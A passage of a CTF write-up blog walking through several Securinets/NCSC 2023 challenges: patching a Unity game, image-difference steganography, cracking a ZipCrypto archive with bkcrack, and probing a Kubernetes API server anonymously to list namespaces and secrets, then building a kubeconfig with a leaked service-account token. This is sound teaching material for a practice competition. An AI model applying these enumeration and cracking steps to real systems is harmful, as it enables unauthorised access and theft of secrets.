display device clear the chars and reset the cursor or write something on the screen!</p>\n<p><img data-src=\"https://imgur.com/QTfwCZC.png\" alt=\"\"></p>\n<p>If you take a closer look you’ll get it! The guy who write the program write something and clear it then write another thing then delete it and so on!<br>\n<img data-src=\"https://imgur.com/GSgaCKF.png\" alt=\"\"></p>\n<p>So now it’s time to check the write blocks and check what that guy try to do! After reversing all the block i got the flag! It’s on the last block! Let me show you how I recover that data!</p>\n<p><img data-src=\"https://imgur.com/HZcwRyX.png\" alt=\"\"></p>\n<p>Using the characters table you can recover the flag! Mapping the signal and the Big table lead you to the flag!</p>\n<p>And This is will be our flag!  <code>Securinets&#123;LcD_1s_H4rD_!:(&#125;</code></p>\n<h1 id=\"game-hacking-platformer\"><a class=\"markdownIt-Anchor\" href=\"#game-hacking-platformer\">#</a> Game Hacking: Platformer:</h1>\n<p><img data-src=\"https://imgur.com/OAyXmNQ.png\" alt=\"\"></p>\n<p>In this challenge we have a game made by unity! It’s 2D platformer game where the player can jump and run in the map! But where is the flag??<br>\n<img data-src=\"https://imgur.com/oIzwhG8.png\" alt=\"\"></p>\n<p>Mmmmm my sixth sense told me that the flag is hidden somewhere in the map and the player can’t reach it! Hack Time!!!</p>\n<p>Let’s change the player ability and let him can move in any place we want it. By disabling the collision and physics mechanism! Good bye gravitiy,Rigidbody,collisions!</p>\n<p>To do this let’s open  <code>Assembly-CSharp.dll</code>  located in  <code>Platformer_Data/Managed</code>  folder.</p>\n<p>Wow! This is the player controller code! that allow the player to move and the animation to be played and responsable for jumping and detect ground detection to deny player to jump many times on the air!</p>\n<p><img data-src=\"https://imgur.com/eD0vAq0.png\" alt=\"\"></p>\n<p>Boring mechanism!! Let me change this shitty code by mine! I’ll let the player move to any point he want!</p>\n<p><img data-src=\"https://imgur.com/DZqPB6p.png\" alt=\"\"><br>\nYou can copy that code</p>\n<figure class=\"highlight csharp\"><figcaption><span>change mechanism</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">Start</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.rb = <span class=\"keyword\">base</span>.GetComponent&lt;Rigidbody2D&gt;();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.rb.isKinematic = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.anim = <span class=\"keyword\">base</span>.GetComponent&lt;Animator&gt;();</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.mySpriteRenderer = <span class=\"keyword\">base</span>.GetComponent&lt;SpriteRenderer&gt;();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Token: 0x06000005 RID: 5</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">FixedUpdate</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">float</span> axisRaw = Input.GetAxisRaw(<span class=\"string\">&quot;Horizontal&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">float</span> verticalInput = Input.GetAxisRaw(<span class=\"string\">&quot;Vertical&quot;</span>);</span><br><span class=\"line\">\tVector3 movement = <span class=\"keyword\">new</span> Vector3(axisRaw, verticalInput, <span class=\"number\">0f</span>).normalized * <span class=\"number\">10f</span> * Time.deltaTime;</span><br><span class=\"line\">\t<span class=\"keyword\">base</span>.transform.Translate(movement);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>After applying the changes our player can now go to any place we want! But i didn’t find the flag! Oh god! This is what i found!<br>\n<img data-src=\"https://imgur.com/6PRgDFo.png\" alt=\"\"></p>\n<p>I checked all the map and sadly nothing interesting 😦</p>\n<p>Let’s check the files again! Maybe we will find something!</p>\n<p><img data-src=\"https://imgur.com/MZ9tbCH.png\" alt=\"\"></p>\n<p>Oh man look here! I found that there is levels on this game! Let me back to the decompiled code!</p>\n<p><img data-src=\"https://imgur.com/yM0C7nL.png\" alt=\"\"></p>\n<p>Oh no! The game is opened on the 2nd level! Let’s change this room to “Level1” and Play again! And yes It’s a new Level</p>\n<p><img data-src=\"https://imgur.com/me4efrx.png\" alt=\"\"></p>\n<p>After moving right and left, I found the flag!</p>\n<p><img data-src=\"https://imgur.com/gj4wGE9.png\" alt=\"\"></p>\n<p>And Yes We did it! Just move right and left and collect the letters ! and you’ll get this one ! Wrap it in Securinets{}<br>\n<img data-src=\"https://imgur.com/cpA2O6c.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;Gam1ng_AnD_L0VE&#125;</code></p>\n<h1 id=\"misc-full-difference\"><a class=\"markdownIt-Anchor\" href=\"#misc-full-difference\">#</a> Misc: Full Difference</h1>\n<p><img data-src=\"https://imgur.com/dROW4SQ.png\" alt=\"\"></p>\n<p>Full Difference, The difference will make a difference! What is that thing ?? we got 2 images with different type but same picture!<br>\n<img data-src=\"https://imgur.com/dr87PxX.png\" alt=\"\"></p>\n<p>Thinking a little bit can we understand what the author means! Full difference! It means that the pixels should be different a full difference! which means the Red,Green and Blue channels should be differents!</p>\n<p>“Will make a difference!” After extracting the different pixels we should calculate the difference between each channels ?? Mmmmm makes sense!</p>\n<figure class=\"highlight python\"><figcaption><span>solver</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> string </span><br><span class=\"line\">im1=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;tobi.jpg&quot;</span>)</span><br><span class=\"line\">im2=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;tobi.png&quot;</span>)</span><br><span class=\"line\">pix2=im2.load()</span><br><span class=\"line\">pix1=im1.load()</span><br><span class=\"line\">width,height=im1.size</span><br><span class=\"line\">result=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">data=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,width):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,height):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pix1[i,j] != pix2[i,j] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">0</span>] != pix2[i,j][<span class=\"number\">0</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">1</span>] != pix2[i,j][<span class=\"number\">1</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">2</span>] != pix2[i,j][<span class=\"number\">2</span>]:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">3</span>):</span><br><span class=\"line\">                data.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">abs</span>(pix1[i,j][k] - pix2[i,j][k])))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.ascii_letters + string.digits + string.punctuation:</span><br><span class=\"line\">        result+=char</span><br><span class=\"line\"></span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure>\n<p>So the logic behind that code is to extract the pixels that have a full difference then calculate the difference between them. After that we convert the numbers to chars (should be printable!)</p>\n<p>This expression will give us the different pixels</p>\n<figure class=\"highlight python\"><figcaption><span>exp</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pix1[i,j] != pix2[i,j] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">0</span>] != pix2[i,j][<span class=\"number\">0</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">1</span>] != pix2[i,j][<span class=\"number\">1</span>] <span class=\"keyword\">and</span> pix1[i,j][<span class=\"number\">2</span>] != pix2[i,j][<span class=\"number\">2</span>]</span><br></pre></td></tr></table></figure>\n<p>In addition this expression collect the result of calculation the diff between the 2 pixels of each image!</p>\n<figure class=\"highlight python\"><figcaption><span>diff</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data.append(<span class=\"built_in\">chr</span>(<span class=\"built_in\">abs</span>(pix1[i,j][k] - pix2[i,j][k])))</span><br></pre></td></tr></table></figure>\n<p>Then it’s time to convert it to printable data!</p>\n<figure class=\"highlight python\"><figcaption><span>print</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> char <span class=\"keyword\">in</span> string.ascii_letters + string.digits + string.punctuation:</span><br><span class=\"line\">        result+=char</span><br></pre></td></tr></table></figure>\n<p>Running this code will give you this base64 encoding!  <code>dGgxNV8xNV9zaDB1TGRfYjNfaDRyRA==</code></p>\n<p>Bingo we got this statement!  <code>th15_15_sh0uLd_b3_h4rD</code> . Let’s wrap it in Securinets! Oh nooo! Didn’t work. I guess the challenge is not finished!</p>\n<p>We have 2 images! PNG and JPEG. Mmmm Let’s try to do some steganography on these images using the password/key that we got previously.</p>\n<p>The 1st idea in my mind is to try steghide! Nothing else! Let’s try it</p>\n<p><img data-src=\"https://imgur.com/VLbBAGf.png\" alt=\"\"></p>\n<p>YEEES MAAN! We got a flag.zip file! But wait it’s protected again 😦. I tried to brute force that thing using rockyou but failed !!! What is going on here! The flag is inside that zip what we should to do now!</p>\n<p>Let’s extract more information about the zip using  <code>7z</code>  utility</p>\n<figure class=\"highlight bash\"><figcaption><span>7z</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">7z l  -slt flag.zip</span><br><span class=\"line\"></span><br><span class=\"line\">Path = flag.txt</span><br><span class=\"line\">Folder = -</span><br><span class=\"line\">Size = 40</span><br><span class=\"line\">Packed Size = 52</span><br><span class=\"line\">Modified = 2022-11-18 21:17:23</span><br><span class=\"line\">Created =</span><br><span class=\"line\">Accessed =</span><br><span class=\"line\">Attributes = A</span><br><span class=\"line\">Encrypted = +</span><br><span class=\"line\">Comment =</span><br><span class=\"line\">CRC = 4F639BBA</span><br><span class=\"line\">Method = ZipCrypto Store</span><br><span class=\"line\">Host OS = FAT</span><br><span class=\"line\">Version = 20</span><br><span class=\"line\">Volume Index = 0</span><br></pre></td></tr></table></figure>\n<p>Nice the flag.txt size is 40 bytes! So our flag is 40-chars strings! The encryption method is  <code>ZipCrypto</code> !</p>\n<p>Bingoo! This method is vulnerable! Let’s check how can we get our flag!</p>\n<p>After some searching we found a repository talking about “Crack legacy zip encryption with Biham and Kocher’s known plaintext attack.”</p>\n<p>I recommend to check this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tpbWNpODYvYmtjcmFjaw==\">repo</span> and understand how this attack can be manipulated and how to install that tool!</p>\n<p>Let’s now start downloading the tool</p>\n<figure class=\"highlight bash\"><figcaption><span>wget</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/kimci86/bkcrack/releases/download/v1.5.0/bkcrack-1.5.0-Linux.tar.gz</span><br></pre></td></tr></table></figure>\n<p>We need to recover the internal key that will allow us to extract the file!</p>\n<p>The attack requires at least 12 bytes of known plaintext. At least 8 of them must be contiguous. The larger the contiguous known plaintext, the faster the attack. In our case we have a flag.txt that contains  <code>Securinets&#123;*&#125;</code></p>\n<p>In our case we know 11 chars ( <code>Securinets&#123;</code> ) and the last char  <code>&#125;</code></p>\n<p>Let’s recover our key now!</p>\n<figure class=\"highlight bash\"><figcaption><span>prepare our data</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;Securinets&#123;&quot;</span> &gt; plaintext.txt</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;&#125;&quot;</span> | xxd <span class=\"comment\"># 7d is the result</span></span><br></pre></td></tr></table></figure>\n<p>The attack requires the plain text content and in case there is another seperate bytes we can specify the offset and the byte value in hex</p>\n<p>Now time to work !</p>\n<figure class=\"highlight bash\"><figcaption><span>get the key</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -p plaintext.txt -x 39 7d </span><br><span class=\"line\"></span><br><span class=\"line\">bkcrack 1.5.0 - 2022-07-07</span><br><span class=\"line\">[16:21:19] Z reduction using 4 bytes of known plaintext</span><br><span class=\"line\">100.0 % (4 / 4)</span><br><span class=\"line\">[16:21:19] Attack on 1405963 Z values at index 6</span><br><span class=\"line\">Keys: 184a904b d4557686 2222c7f2</span><br><span class=\"line\">9.2 % (129555 / 1405963)</span><br><span class=\"line\">[16:24:40] Keys</span><br><span class=\"line\">184a904b d4557686 2222c7f2</span><br></pre></td></tr></table></figure>\n<p>We got the keys !  <code>184a904b d4557686 2222c7f2</code> . Now we can decipher/decrypt the file! which means extract it from the zip!</p>\n<figure class=\"highlight bash\"><figcaption><span>extract</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bkcrack-1.5.0-Linux/bkcrack -C flag.zip -c flag.txt -k 184a904b d4557686 2222c7f2 -d my_flag.txt   </span><br><span class=\"line\"></span><br><span class=\"line\">bkcrack 1.5.0 - 2022-07-07</span><br><span class=\"line\">[16:32:25] Writing deciphered data my_flag.txt (maybe compressed)</span><br><span class=\"line\">Wrote deciphered data.</span><br></pre></td></tr></table></figure>\n<p>Bingo We got the flag!!! How 2 images can hide data like that!</p>\n<p><img data-src=\"https://imgur.com/O8uXhZV.png\" alt=\"\"></p>\n<p>Flag:  <code>Securinets&#123;Z1p_CRyPt0_&amp;_5t3gH1d3_1s_BAd&#125;</code></p>\n<h1 id=\"kubernetes-challenge-serie\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-challenge-serie\">#</a> Kubernetes challenge serie</h1>\n<p>NCSC’2023 consider the 1st tunisian CTF competition that have a whole Kubernetes Category! These are oriented for beginners/Intermediate users to consodilate their basic knowledge in Kubernetes!</p>\n<p><img data-src=\"https://imgur.com/U69KQtM.png\" alt=\"\"></p>\n<h2 id=\"kubernetes-secrets\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-secrets\">#</a> Kubernetes: Secrets:</h2>\n<p>In this challenge we get an IP and the author told us that he have a secret in the cluster!<br>\n<img data-src=\"https://imgur.com/PCmO273.png\" alt=\"\"></p>\n<p>Visiting the IP on the browser will lead us to the author page! This is not our objective!</p>\n<p>We need to access to the API-Server. Let’s check the default port 6443</p>\n<figure class=\"highlight bash\"><figcaption><span>curl</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:6443/version</span><br></pre></td></tr></table></figure>\n<p>And this request is failed! Mmmm The author change the default api-server?? Nmap time! Let’s scan that IP!</p>\n<p>After checking the IP we get that port opened 7443!</p>\n<p><img data-src=\"https://imgur.com/GunNYhA.png\" alt=\"\"></p>\n<p>And Yes! We got a response! It’s KUBERNETES TIME!!</p>\n<p>Let’s check what permission we have as an anonymous users! To be honest I’ll try to check if I can got namespaces Or secrets first! Let me check that!</p>\n<figure class=\"highlight bash\"><figcaption><span>curl-namespaces</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:7443/api/v1/namespaces | grep <span class=\"string\">&#x27;&quot;name&quot;: &quot;&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>And we got a list of namespaces! This is cool! We have  <code>task1,task2,task3 and task4</code>  namespaces! I bet that each challenge is in single namespace! This is Great!<br>\n<img data-src=\"https://imgur.com/vZrtZLd.png\" alt=\"\"></p>\n<p>Hummm We need secrets and this is the 1st challenge! So We are sure that we can list the secrets in the  <code>task1</code>  namespace!</p>\n<figure class=\"highlight bash\"><figcaption><span>curl-namespaces</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -sk https://20.169.73.19:7443/api/v1/namespaces/task1/secrets</span><br></pre></td></tr></table></figure>\n<p>Bingo We got the Secrets List! We are on the right way!<br>\n<img data-src=\"https://imgur.com/0PFJsCI.png\" alt=\"\"></p>\n<p>Flag :  <code>Securinets&#123;S3crEts_Ar3_S0_CriT1c4LL&#125;</code></p>\n<blockquote>\n<p>We got a message! We must check it for sure!</p>\n</blockquote>\n<p>Look what we got here !</p>\n<figure class=\"highlight text\"><figcaption><span>check</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Look here YOU will need this one believe me!!!</span><br><span class=\"line\"> eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg</span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-pody\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-pody\">#</a> Kubernetes: Pody:</h2>\n<p>After getting the secrets we can move to the next challenge that named  <code>Pody</code></p>\n<p><img data-src=\"https://imgur.com/hZQya2W.png\" alt=\"\"></p>\n<p>In this challenge the author told us that the container is inside a pod! So how can we get inside that pod? Thinking a little bit we didn’t get any solution expect opening a shell session inside the pod!</p>\n<p>Kubectl Are you there?? Yes! It’s Kubectl time! I love to work with kubectl I will not waste my time curling endpoints 😃 So I’ll make my kubeconfig file for this challenge!</p>\n<p>When I checked the secrets in the previous challenge I got the certificate authority Certifcate. And of course don’t forget the token that we got!</p>\n<blockquote>\n<p>This token is used for authentication and authorization in kubernetes. This authorization is occur on the api-server level not the etcd!</p>\n</blockquote>\n<p>Let’s make our kubeconfig! But wait! In case you don’t have kubectl, it’s time to install it! You can follow this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rdWJlcm5ldGVzLmlvL2RvY3MvdGFza3MvdG9vbHMvaW5zdGFsbC1rdWJlY3RsLWxpbnV4Lw==\">guide</span> to install it</p>\n<figure class=\"highlight yaml\"><figcaption><span>kubeconfig</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Config</span></span><br><span class=\"line\"><span class=\"attr\">clusters:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">cluster:</span></span><br><span class=\"line\">    <span class=\"attr\">certificate-authority-data:</span>  <span class=\"string\">LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUMvakNDQWVhZ0F3SUJBZ0lCQURBTkJna3Foa2lHOXcwQkFRc0ZBREFWTVJNd0VRWURWUVFERXdwcmRXSmwKY201bGRHVnpNQjRYRFRJek1ETXdOVEV5TWpVMU1sb1hEVE16TURNd01qRXlNalUxTWxvd0ZURVRNQkVHQTFVRQpBeE1LYTNWaVpYSnVaWFJsY3pDQ0FTSXdEUVlKS29aSWh2Y05BUUVCQlFBRGdnRVBBRENDQVFvQ2dnRUJBTDEzCm0rOG5ySVlXU21hQjREMU9yWWJVS1hycE4rS2ZUZDk1TjA2UTQ5U3IyUU1FZkZXZHhjSGJadThRVWRIVXo1dFcKdmVvRnk4cFBpcmhhNHdGYnJEbXczdFp4NlgxbGxEZlp4b29jd1ZBOS9pMTBjNGE4TURvOGVuc1hlYWU1TytZcQpMZmdiM04zcWZYYjZmSHAzekwxeHJzWThPUEZVeHhmU3AxaElXa0RNZ0tZY0lhU2NoRVUzYTk0ZityY2tIOUFwCnltRi95TlB3bXgyU1RFZUVFSkZoZFdWUzVVamdSTmxnNzFPWklyb05DMXMzWEJxb2RiZ1FWUjBUeTI5bnJGc0QKQnBJQW1WQVRCS3QxTjcyRjRMRDA0c3M3QVUxU0NDSCtoUmlrTWE1ZkdtOTBjMWRacEVuZ1IyVEUwSzZ4WVY3TAplOElrcE5WOVBaLy9RT2ZqSnFFQ0F3RUFBYU5aTUZjd0RnWURWUjBQQVFIL0JBUURBZ0trTUE4R0ExVWRFd0VCCi93UUZNQU1CQWY4d0hRWURWUjBPQkJZRUZBWWUzVktNRDY3T3V5NWhWTGxTN0RWeU52SExNQlVHQTFVZEVRUU8KTUF5Q0NtdDFZbVZ5Ym1WMFpYTXdEUVlKS29aSWh2Y05BUUVMQlFBRGdnRUJBSE9EMUNTNGQzNjJLRXE1dTZyQwpQOEF6a3hDMTJDdVF1bDh4aUVTajZ4M25wb25oT2M3WU0zRUhQZk5wNHRDZmNsdFpDMU51SXNrVDRuSkRLRTFYCjRNVFNOL0kxVDlGSHd5SUhNbDZMZm1RL1ZLVlo1YlZJMEZlUENQanFnOWZSbHFYaitsRUxJQnRJVE0xbUlmeW0KZlZmMisrS3h4OTFTME54bWRKUzU0amY1SUJMRVh2SnRiWFYrblZ1ekhER3l5eDREblVDMm4zR3NrcEtBOGRJRQpZZktRWk5IZjJ4L0FySWM2a3A0em9TSWI1RVQvdDk4b3p5R2pldlVnbDd1L0orUzkwTS9pWWgyaGlGSXRRVE1WCnBTa0pQM1lIbDlzWVRSS0dXZTBtcEtnVm1RZm9VTVNzdURrRnZ4ZFNhVG9QQUN6aUdxdUNnVXVyWHMxNXJjOWkKR2xBPQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0tCg==</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span> <span class=\"string\">https://20.169.73.19:7443</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">raf-k8s</span></span><br><span class=\"line\"><span class=\"attr\">contexts:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">context:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">ncsc-sa@raf-k8s</span></span><br><span class=\"line\">  <span class=\"attr\">context:</span></span><br><span class=\"line\">    <span class=\"attr\">cluster:</span> <span class=\"string\">raf-k8s</span></span><br><span class=\"line\">    <span class=\"attr\">user:</span> <span class=\"string\">ncsc-sa</span></span><br><span class=\"line\"><span class=\"attr\">current-context:</span> <span class=\"string\">ncsc-sa@raf-k8s</span></span><br><span class=\"line\"><span class=\"attr\">users:</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">ncsc-sa</span></span><br><span class=\"line\">  <span class=\"attr\">user:</span></span><br><span class=\"line\">    <span class=\"attr\">token:</span> <span class=\"string\">eyJhbGciOiJSUzI1NiIsImtpZCI6IkZwcWlIMGR2QlJ5Q0ZwTHV5a0JFQnlEcVI5UWZHLUdsY2NLQkkyMGlZWU0ifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJ0YXNrMiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJwb2QtbGlzdGVyLXRva2VuLXpoNHM2Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6InBvZC1saXN0ZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyZjc2YjA3ZS0wY2NjLTRhMDQtYWUxZi1jNGJhMzIxZjYzZmQiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6dGFzazI6cG9kLWxpc3RlciJ9.cewI8cdU8u-MxhLW5enn9bqj2DnD6Kn6iJZD2Y70uSIN-Pdq4VGrCNN0oB0edWaNZd_2o3NCVfE1GY9JRIjQeMuV_Uk5-tEQ62TS1b2hpHPoq8FtRFDyji26LyTR2XGU7gSYdQV6G8axOU3z8_RRWQarN5VfSgDp-WmwizjwWJLMhENGgvWBxOKjHrF0tDCEmshH1g841NB4XtzeiXRxEC1AN9kNv-7SZvYWasHbPuva-fsGBp-AvhUUTStcCVahZ8VElJ51q3VxKBTXX-DoDWfsVD5rOcCse0yj4jxgN3GIqjIaAcjBiPI2XmhQv-tMMbYpj7gfAxrzhdh77UfaBg</span></span><br></pre></td></tr></table></figure>\n<p>This kubeconfig file will allow us to authenticate to the api-server using kubectl utility without wasting time specifying the token and other stuff!</p>\n<p>Assume that you save that file in name  <code>ncsc-k8s.conf</code> . Let’s export the KUBECONFIG env var.</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ <span class=\"built_in\">export</span> 